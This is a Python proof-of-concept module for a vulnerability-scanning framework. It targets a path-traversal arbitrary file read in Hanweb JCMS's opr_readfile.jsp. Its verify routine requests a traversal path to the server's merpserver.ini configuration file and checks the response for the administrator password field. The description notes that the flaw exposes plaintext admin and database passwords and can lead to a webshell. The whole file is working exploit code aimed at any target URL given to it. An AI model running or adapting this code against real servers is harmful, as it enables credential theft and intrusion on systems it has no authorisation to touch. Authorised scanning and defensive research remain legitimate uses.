# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'JCMS_0002'  # 平台漏洞编号，留空
    name = '大汉JCMS /opr_readfile.jsp 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-06-01'  # 漏洞公布时间
    desc = '''
        大汉版通jcms系统任意文件读取，可以直接获取管理员账号，密码明文、数据库密码明文、
        配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/26672.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c0df664c-eb5a-4b4b-bf5a-e0c1caf3a576'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = ('%s/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename='
                          '../../../../../../WEB-INF/ini/merpserver.ini') % self.target

            req = requests.get(verify_url)
            if req.status_code == 200 and 'AdminPW' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
